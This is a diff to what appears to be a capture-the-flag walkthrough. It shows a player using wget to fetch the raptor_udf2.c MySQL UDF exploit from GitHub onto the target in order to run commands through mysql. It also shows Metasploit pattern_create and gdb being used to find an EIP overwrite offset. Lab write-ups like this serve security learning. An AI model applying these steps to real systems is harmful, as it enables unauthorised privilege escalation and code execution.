@@ -376,10 +376,7 @@ We want to make `mysql` execute commands for us. We heard about UDF. We found [t
 ```bash
 level9@harmonie-technologie:~$ cd /tmp/
 level9@harmonie-technologie:/tmp$ wget https://raw.githubusercontent.com/ankh2054/MySQL-UDF/master/raptor_udf2.c
-[...]
-Saving to: ‘raptor_udf2.c’
 raptor_udf2.c                100%[============================================>]   2.59K  --.-KB/s    in 0s      
-2018-07-04 16:42:25 (39.6 MB/s) - ‘raptor_udf2.c’ saved [2654/2654]
 ```
 We compile our source code, and we execute `mysql`
 ```bash
@@ -471,6 +468,9 @@ Here, we want to find offset to overwrite `EIP`. To that purpose we use pattern-
 ```bash
 root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+Let's use this pattern inside gdb
+```bash
 levelfinal@harmonie-technologie:~$ gdb ./levelfinal -q
 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 Program received signal SIGSEGV, Segmentation fault.
